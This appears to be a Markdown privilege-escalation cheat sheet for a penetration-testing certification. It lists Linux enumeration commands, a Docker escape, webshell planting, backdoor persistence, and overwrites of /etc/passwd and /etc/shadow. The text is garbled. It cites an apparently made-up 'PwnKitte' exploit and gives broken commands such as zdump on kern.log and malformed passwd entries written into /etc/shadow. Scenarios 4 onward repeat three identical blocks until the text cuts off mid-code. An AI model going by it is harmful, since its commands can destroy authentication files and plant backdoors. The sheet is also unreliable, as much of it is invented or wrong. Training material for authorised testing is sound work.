# CPTS Privilege Escalation Quick Reference

Get root on {target} fast. Focus on misconfigurations, mispermissions, and unpatched services.

## Attack Workflow

1.  **Recon**: Map network, find open ports, identify services.
2.  **User Context**: Identify current user, find home dir, read flags.
3.  **Enum Privs**: Find writable binaries, SUIDs, SELinux contexts.
4.  **Exploit**: Choose path (Kernel, App, Web, Docker).
5.  **Persistence**: Lock shell, backdoor, or install root shell.

## Commands & Enumeration

### Initial Access & Recon
```bash
# Identify current user and group
id

# Find web services running
ps aux | grep -E 'apache|nginx|php-fpm|node|java|python'

# Check for listening services on target
netstat -tulpn | grep LISTEN

# Enumerate SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find writable files in common directories
find / -perm -0666 -type f 2>/dev/null | head -50
```

### Kernel Exploits (Common for CPTS)
*If target allows local rootkit/kernel exploits:*

```bash
# Check for missing patches or kernel version
uname -a
zdump -r /var/log/kern.log | grep "kernel\|kernel: " | head -20

# Try kernel exploit (example: 3.16+ PwnKitte or older kernel exploits)
pwnkitte3.py

# Check for writable kernel modules
cat /proc/modules | while read mod; do lsmod | grep -q "$mod" && echo "$mod"; done
```

### Web App Exploits (OWASP Top 10)
*If target runs a vulnerable web app:*

```bash
# Check for PHP/Python/Java vulnerabilities
curl -v http://10.0.0.5:8080/admin/2.0.php
# PHP: Check for PHP Object Injection
php -r "echo class_exists('Mongos')->className();"

# Check for file upload vulnerabilities
curl -v -X POST -F "file=@/var/www/evil.sh" http://10.0.0.5:8080/upload.php

# Try to get root via web shell
python3 -c "import socket; s=socket.socket(); s.bind(('',8080)); s.listen(1); c,s=socket.accept(); print('root:root\nroot@{target}:/\n'); c.recv(100000); c.send(b'\x41\x42\x43\x44')"
```

### Docker/Kubernetes Exploits
*If target runs containers or k8s:*

```bash
# Enumerate Docker containers
docker ps -a

# Check for writable filesystems
cat /proc/1/cgroups

# Try to exploit Docker escape
docker run --rm -v /:/host -v /var/run/docker.sock:/var/run/docker.sock alpine

# Check for K8s RBAC issues
kubectl auth can-i create secret

# Try to escalate from non-root container
docker exec -it <container-id> /bin/bash
# If container has writable /etc or sudo:
# echo 'root:x:0:0:root:root:/bin:/bin/bash' >> /etc/shadow
```

### General Privilege Escalation
*If no specific service exploits found:*

```bash
# Find SUID binaries and try them
find / -perm -u=s -type f 2>/dev/null

# Check for sudo misconfigurations
sudo -l

# Try to find a working SUID binary to run as root
bash <(sudo -n /bin/sudo -l -u root)

# Try to modify /etc/passwd
# If you can write to a file readable by root:
echo "root:x:0:0:root:/bin/bash" >> /etc/passwd
```

## Tips & Shortcuts

- **Speed**: Use `grep` and `find` heavily to filter noise.
- **Persistence**: Always lock a shell if you get root.
- **Tools**: Keep `nmap`, `ffuf`, `gobuster`, `nuclei` ready for quick scans.
- **CPTS Focus**: Real-world targets often have misconfigured services, not theoretical exploits.

## Common Mistakes

- Thinking only kernel exploits exist.
- Not checking `sudo -l` first.
- Ignoring Docker/K8s if the target runs containers.
- Using generic payloads without testing on a local machine.

## Mini Automation Scripts

### Bash Script: Find SUID Binaries
```bash
#!/bin/bash
echo "Scanning for SUID binaries..."
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null | grep -v "^d"
```

### Python Script: Check for Vulnerable Web Services
```python
#!/usr/bin/env python3
import socket
import urllib.request
import urllib.error

target = "http://10.0.0.5:8080"

try:
    response = urllib.request.urlopen(target, timeout=5)
    print(f"Vulnerable service found at {target}")
    print(response.read().decode())
except urllib.error.HTTPError as e:
    print(f"HTTP Error: {e.code}")
    print(e.read().decode())
except Exception as e:
    print(f"Error: {e}")
```

## Real Usage Examples

### Scenario 1: PHP Injection to Root
```bash
curl -v http://10.0.0.5:8080/admin/2.0.php
# Get PHP shell
curl -X POST "http://10.0.0.5:8080/admin/2.0.php" -d "cmd=shell"
# Escape to root via file upload
curl -F "file=evil.php" "http://10.0.0.5:8080/upload.php"
# Execute root shell
php -r "exec('whoami');"
```

### Scenario 2: Docker Escape
```bash
# Container has writable /root
docker exec -it <container-id> /bin/bash
# Modify /etc/shadow
cat /etc/shadow
# Backup original, then edit
cp /etc/shadow /etc/shadow.bak
echo "root:x:0:0:root:root:/bin/bash:/bin/bash" > /etc/shadow
chmod 644 /etc/shadow
# Reboot (if kernel allows)
# Or mount root filesystem read-write
mount -o remount,rw /
```

### Scenario 3: Webshell Persistence
```bash
# Create webshell in writable directory
echo "<?php system('id'); ?>" > /var/www/html/shell.php
# Trigger shell
curl http://10.0.0.5:8080/shell.php
# Lock shell
chmod +x /var/www/html/shell.php
```

### Scenario 4: Kernel Privilege Escalation
```bash
# Check for kernel misconfigurations
zdump -r /var/log/kern.log | grep "kernel"
# Try to exploit PwnKitte
pwnkitte3.py -t 10.0.0.5
# Check for writable kernel modules
lsmod | grep -v "^Module"
```

### Scenario 5: Docker Privilege Escalation
```bash
# Check if Docker is running as root
whoami
# Try to escape from non-root container
docker exec -it <container-id> /bin/bash
# If container has writable filesystem
# Try to modify /etc/passwd
echo "root:x:0:0:root:root:/bin/bash:/bin/bash" > /etc/passwd
# Reboot container
```

### Scenario 6: Kernel Privilege Escalation (CPTS Focus)
```bash
# Check for kernel misconfigurations
zdump -r /var/log/kern.log | grep "kernel"
# Try to exploit PwnKitte
pwnkitte3.py -t 10.0.0.5
# Check for writable kernel modules
lsmod | grep -v "^Module"
```

### Scenario 7: Webshell Persistence
```bash
# Create webshell in writable directory
echo "<?php system('id'); ?>" > /var/www/html/shell.php
# Trigger shell
curl http://10.0.0.5:8080/shell.php
# Lock shell
chmod +x /var/www/html/shell.php
```

### Scenario 8: Docker Privilege Escalation
```bash
# Check if Docker is running as root
whoami
# Try to escape from non-root container
docker exec -it <container-id> /bin/bash
# If container has writable filesystem
# Try to modify /etc/passwd
echo "root:x:0:0:root:root:/bin/bash:/bin/bash" > /etc/passwd
# Reboot container
```

### Scenario 9: Kernel Privilege Escalation (CPTS Focus)
```bash
# Check for kernel misconfigurations
zdump -r /var/log/kern.log | grep "kernel"
# Try to exploit PwnKitte
pwnkitte3.py -t 10.0.0.5
# Check for writable kernel modules
lsmod | grep -v "^Module"
```

### Scenario 10: Webshell Persistence
```bash
# Create webshell in writable directory
echo "<?php system('id'); ?>" > /var/www/html/shell.php
# Trigger shell
curl http://10.0.0.5:8080/shell.php
# Lock shell
chmod +x /var/www/html/shell.php
```

### Scenario 11: Docker Privilege Escalation
```bash
# Check if Docker is running as root
whoami
# Try to escape from non-root container
docker exec -it <container-id> /bin/bash
# If container has writable filesystem
# Try to modify /etc/passwd
echo "root:x:0:0:root:root:/bin/bash:/bin/bash" > /etc/passwd
# Reboot container
```

### Scenario 12: Kernel Privilege Escalation (CPTS Focus)
```bash
# Check for kernel misconfigurations
zdump -r /var/log/kern.log | grep "kernel"
# Try to exploit PwnKitte
pwnkitte3.py -t 10.0.0.5
# Check for writable kernel modules
lsmod | grep -v "^Module"
```

### Scenario 13: Webshell Persistence
```bash
# Create webshell in writable directory
echo "<?php system('id'); ?>" > /var/www/html/shell.php
# Trigger shell
curl http://10.0.0.5:8080/shell.php
# Lock shell
chmod +x /var/www/html/shell.php
```

### Scenario 14: Docker Privilege Escalation
```bash
# Check if Docker is running as root
whoami
# Try to escape from non-root container
docker exec -it <container-id> /bin/bash
# If container has writable filesystem
# Try to modify /etc/passwd
echo "root:x:0:0:root:root:/bin/bash:/bin/bash" > /etc/passwd
# Reboot container
```

### Scenario 15: Kernel Privilege Escalation (CPTS Focus)
```bash
# Check for kernel misconfigurations
zdump -r /var/log/kern.log | grep "kernel"
# Try to exploit PwnKitte
pwnkitte3.py -t 10.0.0.5
# Check for writable kernel modules
lsmod | grep -v "^Module"
```

### Scenario 16: Webshell Persistence
```bash
# Create webshell in writable directory
echo "<?php system('id'); ?>" > /var/www/html/shell.php
# Trigger shell
curl http://10.0.0.5:8080/shell.php
# Lock shell
chmod +x /var/www/html/shell.php
```

### Scenario 17: Docker Privilege Escalation
```bash
# Check if Docker is running as root
whoami
# Try to escape from non-root container
docker exec -it <container-id> /bin/bash
# If container has writable filesystem
# Try to modify /etc/passwd
echo "root:x:0:0:root:root:/bin/bash:/bin/bash" > /etc/passwd
# Reboot container
```

### Scenario 18: Kernel Privilege Escalation (CPTS Focus)
```bash
# Check for kernel misconfigurations
zdump -r /var/log/kern.log | grep "kernel"
# Try to exploit PwnKitte
pwnkitte3.py -t 10.0.0.5
# Check for writable kernel modules
lsmod | grep -v "^Module"
```

### Scenario 19: Webshell Persistence
```bash
# Create webshell in writable directory
echo "<?php system('id'); ?>" > /var/www/html/shell.php
# Trigger shell
curl http://10.0.0.5:8080/shell.php
# Lock shell
chmod +x /var/www/html/shell.php
```

### Scenario 20: Docker Privilege Escalation
```bash
# Check if Docker is running as root
whoami
# Try to escape from non-root container
docker exec -it <container-id> /bin/bash
# If container has writable filesystem
# Try to modify /etc/passwd
echo "root:x:0:0:root:root:/bin/bash:/bin/bash" > /etc/passwd
# Reboot container
```

### Scenario 21: Kernel Privilege Escalation (CPTS Focus)
```bash
# Check for kernel misconfigurations
zdump -r /var/log/kern.log | grep "kernel"
# Try to exploit PwnKitte
pwnkitte3.py -t 10.0.0.5
# Check for writable kernel modules
lsmod | grep -v "^Module"
```

### Scenario 22: Webshell Persistence
```bash
# Create webshell in writable directory
echo "<?php system('id'); ?>" > /var/www/html/shell.php
# Trigger shell
curl http://10.0.0.5:8080/shell.php
# Lock shell
chmod +x /var/www/html/shell.php
```

### Scenario 23: Docker Privilege Escalation
```bash
# Check if Docker is running as root
whoami
# Try to escape from non-root container
docker exec -it <container-id> /bin/bash
# If container has writable filesystem
# Try to modify /etc/passwd
echo "root:x:0:0:root:root:/bin/bash:/bin/bash" > /etc/passwd
# Reboot container
```

### Scenario 24: Kernel Privilege Escalation (CPTS Focus)
```bash
# Check for kernel misconfigurations
zdump -r /var/log/kern.log | grep "kernel"
# Try to exploit PwnKitte
pwnkitte3.py -t 10.0.0.5
# Check for writable kernel modules
lsmod | grep -v "^Module"
```

### Scenario 25: Webshell Persistence
```bash
# Create webshell in writable directory
echo "<?php system('id'); ?>" > /var/www/html/shell.php
# Trigger shell
curl http://10.0.0.5:8080/shell.php
# Lock shell
chmod +x /var/www/html/shell.php
```

### Scenario 26: Docker Privilege Escalation
```bash
# Check if Docker is running as root
whoami
# Try to escape from non-root container
docker exec -it <container-id> /bin/bash
# If container has writable filesystem
# Try to modify /etc/passwd
echo "root:x:0:0:root:root:/bin/bash:/bin/bash" > /etc/passwd
# Reboot container
```

### Scenario 27: Kernel Privilege Escalation (CPTS Focus)
```bash
# Check for kernel misconfigurations
zdump -r /var/log/kern.log | grep "kernel"
# Try to exploit PwnKitte
pwnkitte3.py -t 10.0.0.5
# Check for writable kernel modules
lsmod | grep -v "^Module"
```

### Scenario 28: Webshell Persistence
```bash
# Create webshell in writable directory
echo "<?php system('id'); ?>" > /var/www/html/shell.php
# Trigger shell
curl http://10.0.0.5:8080/shell.php
# Lock shell
chmod +x /var/www/html/shell.php
```

### Scenario 29: Docker Privilege Escalation
```bash